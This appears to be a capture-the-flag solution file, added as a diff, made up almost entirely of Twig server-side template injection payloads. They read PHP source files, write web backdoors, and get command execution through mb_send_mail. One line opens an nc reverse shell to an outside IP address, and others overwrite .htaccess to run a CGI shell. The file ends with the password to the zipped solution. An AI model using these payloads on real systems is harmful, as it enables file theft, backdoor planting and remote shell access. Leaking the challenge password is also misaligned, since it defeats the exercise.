@@ -1,0 +1,49 @@
+######################################## Test SSTI ########################################
+
+#### 1 - Simple SSTI Math Expression
+{{7*7}}
+
+#### 2 - File Read
+{{['file:///www/src/Controller/DefaultController.php']|map('file_get_contents')|join}}
+
+#### 3 - Binary File Read 
+{{['php://filter/convert.base64-encode/resource=/www/src/Controller/DefaultController.php']|map('file_get_contents')|join}}
+
+#### 4 - PHP Info Write
+{{['/www/public/info.php',"<?php phpinfo();"]|sort('file_put_contents')}}
+
+#### 5 - PHP Not Working Backdoor
+{{['/www/public/backdoor.php',"<?php system('id');"]|sort('file_put_contents')}}
+
+
+######################################## Solution 1 ########################################
+
+#### 1 - PHP RCE mb_send_mail
+{{['/www/public/backdoor.php',"<?php mb_send_mail('', '', '', '', '-H \"touch /tmp/rce\"');"]|sort('file_put_contents')}}
+
+#### 2 - PHP RCE Reverse Shell
+{{['/www/public/backdoor.php',"<?php mb_send_mail('', '', '', '', '-H \"nc 3.124.142.205 16204 -e /bin/sh\"');"]|sort('file_put_contents')}}
+
+
+######################################## Solution 2 ########################################
+
+#### 1 - Overwrite .htaccess
+%7B%7B%5B'/www/public/.htaccess',%22Options%20+ExecCGI%0AAddHandler%20cgi-script%20.nriver%0A%22%5D%7Csort('file_put_contents')%7D%7D
+
+#### 2 - Create "shell.nriver"
+%7B%7B%5B'/www/public/shell.nriver',511%5D%7Csort('chmod')%7D%7D
+
+#### 3 - Chmod 777 shell.nriver
+{{['/www/public/shell.nriver',511]|sort('chmod')}}
+
+#### 4 - Call new CGI
+curl http://127.0.0.1/shell.nriver
+
+
+######################################## Zip solution ########################################
+
+#### 1 - Command to zip with password
+7z a -p -mhe=on solve.7z solve
+
+#### 2 - Password
+d0nt_try_t0_ch34t!
